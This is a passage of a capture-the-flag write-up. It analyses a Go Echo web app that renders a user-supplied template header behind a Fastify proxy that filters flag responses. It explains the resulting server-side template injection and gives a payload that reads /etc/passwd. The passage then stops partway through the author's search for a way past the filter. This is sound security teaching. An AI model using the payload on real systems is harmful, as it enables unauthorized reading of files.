<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">Fastify</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fastify&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">proxy</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@fastify/http-proxy&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">server</span> <span class="o">=</span> <span class="nx">Fastify</span><span class="p">({</span> <span class="nx">logger</span><span class="o">:</span> <span class="kc">true</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">server</span><span class="p">.</span><span class="nx">register</span><span class="p">(</span><span class="nx">proxy</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">upstream</span><span class="o">:</span> <span class="s1">&#39;http://app:3001&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">replyOptions</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">rewriteRequestHeaders</span><span class="o">:</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">headers</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">allowedHeaders</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;host&#39;</span><span class="p">,</span> <span class="s1">&#39;user-agent&#39;</span><span class="p">,</span> <span class="s1">&#39;accept&#39;</span><span class="p">,</span> <span class="s1">&#39;template&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">fromEntries</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">headers</span><span class="p">).</span><span class="nx">filter</span><span class="p">(</span><span class="nx">el</span> <span class="p">=&gt;</span> <span class="nx">allowedHeaders</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">el</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">onResponse</span><span class="o">:</span> <span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">reply</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">dataChunk</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="nx">chunk</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dataChunk</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">chunk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;end&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">dataChunk</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="sr">/ACSC\{.*\}/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="nx">reply</span><span class="p">.</span><span class="nx">code</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;??&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">reply</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">server</span><span class="p">.</span><span class="nx">listen</span><span class="p">({</span> <span class="nx">host</span><span class="o">:</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="nx">port</span><span class="o">:</span> <span class="mi">3000</span> <span class="p">})</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reading through the code, basically, it will make a request to <code>http://app:3001</code> in local, and then it will check whether the response has <code>ACSC</code> on it or not. If there is, it won&rsquo;t return the full response of the app.</p>
<p>Let&rsquo;s continue by checking the <code>app</code> server code.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;bytes&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;html/template&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;net/http&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;os&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/labstack/echo/v4&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/labstack/echo/v4/middleware&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">templateMiddleware</span><span class="p">(</span><span class="nx">next</span> <span class="nx">echo</span><span class="p">.</span><span class="nx">HandlerFunc</span><span class="p">)</span> <span class="nx">echo</span><span class="p">.</span><span class="nx">HandlerFunc</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="kd">func</span><span class="p">(</span><span class="nx">c</span> <span class="nx">echo</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">file</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Open</span><span class="p">(</span><span class="s">&#34;./template.html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">err</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="nx">stat</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">file</span><span class="p">.</span><span class="nf">Stat</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">err</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="nx">buf</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nx">stat</span><span class="p">.</span><span class="nf">Size</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">		<span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">file</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="nx">buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">err</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">userTemplate</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">Request</span><span class="p">().</span><span class="nx">Header</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="s">&#34;Template&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">userTemplate</span> <span class="o">!=</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">buf</span> <span class="p">=</span> <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">userTemplate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">c</span><span class="p">.</span><span class="nf">Set</span><span class="p">(</span><span class="s">&#34;template&#34;</span><span class="p">,</span> <span class="nx">buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nf">next</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">handleIndex</span><span class="p">(</span><span class="nx">c</span> <span class="nx">echo</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">tmpl</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="s">&#34;template&#34;</span><span class="p">).([]</span><span class="kt">byte</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">!</span><span class="nx">ok</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;failed to get template&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">tmplStr</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">tmpl</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">t</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">template</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;page&#34;</span><span class="p">).</span><span class="nf">Parse</span><span class="p">(</span><span class="nx">tmplStr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">buf</span> <span class="o">:=</span> <span class="nb">new</span><span class="p">(</span><span class="nx">bytes</span><span class="p">.</span><span class="nx">Buffer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">t</span><span class="p">.</span><span class="nf">Execute</span><span class="p">(</span><span class="nx">buf</span><span class="p">,</span> <span class="nx">c</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nf">HTML</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusOK</span><span class="p">,</span> <span class="nx">buf</span><span class="p">.</span><span class="nf">String</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">e</span> <span class="o">:=</span> <span class="nx">echo</span><span class="p">.</span><span class="nf">New</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">e</span><span class="p">.</span><span class="nf">Use</span><span class="p">(</span><span class="nx">middleware</span><span class="p">.</span><span class="nf">Logger</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">	<span class="nx">e</span><span class="p">.</span><span class="nf">Use</span><span class="p">(</span><span class="nx">middleware</span><span class="p">.</span><span class="nf">Recover</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">e</span><span class="p">.</span><span class="nf">GET</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="nx">handleIndex</span><span class="p">,</span> <span class="nx">templateMiddleware</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">e</span><span class="p">.</span><span class="nx">Logger</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nf">Start</span><span class="p">(</span><span class="s">&#34;:3001&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that in <code>templateMiddleware</code>, there is a logic where:</p>
<ul>
<li>If user request header <code>Template</code> is set, it will use the user template instead of the default template. and set it in the <code>echo.Context</code>.</li>
</ul>
<p>And then, in the <code>handleIndex</code>, it will:</p>
<ul>
<li>Fetch the stored <code>Template</code> inside <code>echo.Context</code></li>
<li>Serve the template.
<ul>
<li>And also during serving the template, it injects <code>echo.Context</code> into it.</li>
</ul>
</li>
</ul>
<p>From those codes, we can see the app is vulnerable to Server-Side Template Injection, because we can define our own template. However, there is a WAF that we need to bypass as well if we&rsquo;re able to read the <code>/flag</code> file because the content of the read file isn&rsquo;t allowed to contain <code>ACSC</code>.</p>
<h3 id="exploitation-1">Exploitation</h3>
<p>Now that we know the bug, I decided to browse first on how SSTI in Golang works. <a href="https://www.onsecurity.io/blog/go-ssti-method-research/" target="_blank" rel="noopener noreffer ">This article</a> helps me a lot on understanding how the SSTI works. The <code>.</code> scope in the template is coming from the injected <code>echo.Context</code> variable. Basically, what we need to do to solve this challenge is:</p>
<ul>
<li>Find a good method under <code>echo.Context</code> so that we can read the <code>/flag</code></li>
<li>Remove the <code>ACSC</code> string in the flag before returning it.</li>
</ul>
<p>Now, based on that article, it is actually very easy to read a file. We can inject <code>{{ .File &quot;/etc/passwd&quot; }}</code> to read a file, because <code>echo.Context</code> interface has <code>File</code> method</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl">    <span class="c1">// File sends a response with the content of the file.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">File</span><span class="p">(</span><span class="nx">file</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">error</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>However, we can&rsquo;t do that directly to the <code>/flag</code> because the WAF will prevent it.</p>
<p>So, I decided to explore the <code>echo.Context</code> interface one by one. First thing that I notice:</p>
<ul>
<li><code>echo.Context</code> has <code>Echo()</code> command to get back to the <code>echo</code> instance.</li>
</ul>
<p>So, I try to explore the <code>Echo</code> definition.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="c1">// Located in echo/echo.go
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">type</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Echo is the top-level framework instance.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// Goroutine safety: Do not mutate Echo instance fields after server has started. Accessing these
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// fields from handlers/middlewares and changing field values at the same time leads to data-races.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// Adding new routes after the server has been started is also not safe!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">Echo</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">filesystem</span>
</span></span><span class="line"><span class="cl">		<span class="nx">common</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// startupMutex is mutex to lock Echo instance access during server configuration and startup. Useful for to get
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="c1">// listener address info (on which interface/port was listener binded) without having data races.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">startupMutex</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">RWMutex</span>
</span></span><span class="line"><span class="cl">		<span class="nx">colorer</span>      <span class="o">*</span><span class="nx">color</span><span class="p">.</span><span class="nx">Color</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// premiddleware are middlewares that are run before routing is done. In case a pre-middleware returns
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="c1">// an error the router is not executed and the request will end up in the global error handler.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">premiddleware</span> <span class="p">[]</span><span class="nx">MiddlewareFunc</span>
</span></span><span class="line"><span class="cl">		<span class="nx">middleware</span>    <span class="p">[]</span><span class="nx">MiddlewareFunc</span>
</span></span><span class="line"><span class="cl">		<span class="nx">maxParam</span>      <span class="o">*</span><span class="kt">int</span>
</span></span><span class="line"><span class="cl">		<span class="nx">router</span>        <span class="o">*</span><span class="nx">Router</span>
</span></span><span class="line"><span class="cl">		<span class="nx">routers</span>       <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="o">*</span><span class="nx">Router</span>
</span></span><span class="line"><span class="cl">		<span class="nx">pool</span>          <span class="nx">sync</span><span class="p">.</span><span class="nx">Pool</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">StdLogger</span>        <span class="o">*</span><span class="nx">stdLog</span><span class="p">.</span><span class="nx">Logger</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Server</span>           <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Server</span>
</span></span><span class="line"><span class="cl">		<span class="nx">TLSServer</span>        <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Server</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Listener</span>         <span class="nx">net</span><span class="p">.</span><span class="nx">Listener</span>
</span></span><span class="line"><span class="cl">		<span class="nx">TLSListener</span>      <span class="nx">net</span><span class="p">.</span><span class="nx">Listener</span>
</span></span><span class="line"><span class="cl">		<span class="nx">AutoTLSManager</span>   <span class="nx">autocert</span><span class="p">.</span><span class="nx">Manager</span>
</span></span><span class="line"><span class="cl">		<span class="nx">DisableHTTP2</span>     <span class="kt">bool</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Debug</span>            <span class="kt">bool</span>
</span></span><span class="line"><span class="cl">		<span class="nx">HideBanner</span>       <span class="kt">bool</span>
</span></span><span class="line"><span class="cl">		<span class="nx">HidePort</span>         <span class="kt">bool</span>
</span></span><span class="line"><span class="cl">		<span class="nx">HTTPErrorHandler</span> <span class="nx">HTTPErrorHandler</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Binder</span>           <span class="nx">Binder</span>
</span></span><span class="line"><span class="cl">		<span class="nx">JSONSerializer</span>   <span class="nx">JSONSerializer</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Validator</span>        <span class="nx">Validator</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Renderer</span>         <span class="nx">Renderer</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Logger</span>           <span class="nx">Logger</span>
</span></span><span class="line"><span class="cl">		<span class="nx">IPExtractor</span>      <span class="nx">IPExtractor</span>
</span></span><span class="line"><span class="cl">		<span class="nx">ListenerNetwork</span>  <span class="kt">string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// OnAddRouteHandler is called when Echo adds new route to specific host router.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">OnAddRouteHandler</span> <span class="kd">func</span><span class="p">(</span><span class="nx">host</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">route</span> <span class="nx">Route</span><span class="p">,</span> <span class="nx">handler</span> <span class="nx">HandlerFunc</span><span class="p">,</span> <span class="nx">middleware</span> <span class="p">[]</span><span class="nx">MiddlewareFunc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>I saw an interesting field embedded in the <code>Echo</code> struct, which is <code>filesystem</code>. I tried to explore that, and below is the result:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="c1">// Located in io/fs/fs.go
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="c1">// An FS provides access to a hierarchical file system.
</span></span></span><span class="line"><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1">// The FS interface is the minimum implementation required of the file system.
</span></span></span><span class="line"><span class="cl"><span class="c1">// A file system may implement additional interfaces,
</span></span></span><span class="line"><span class="cl"><span class="c1">// such as ReadFileFS, to provide additional or optimized functionality.
